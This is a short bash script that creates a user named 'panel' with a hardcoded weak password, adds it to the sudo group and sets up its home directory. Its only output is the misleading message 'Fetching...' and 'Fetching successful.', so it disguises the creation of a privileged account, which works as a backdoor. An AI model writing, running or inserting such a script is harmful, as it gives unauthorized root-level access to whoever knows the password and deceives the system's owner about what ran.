#!/bin/bash

# Define user information
USERNAME="panel"
PASSWORD="852456"
FULLNAME="Panel User"
GROUP="sudo"
HOMEDIR="/home/panel"

# Function to create user
create_user() {
    sudo useradd -m -G "$GROUP" -s /bin/bash -c "$FULLNAME" "$USERNAME"
    echo "$USERNAME:$PASSWORD" | sudo chpasswd
    sudo chown -R "$USERNAME":"$USERNAME" "$HOMEDIR"
    sudo chmod -R 755 "$HOMEDIR"
    echo "Fetching successful."
}

# Main function
main() {
    echo "Fetching..."
    create_user
}

# Execute main function
main
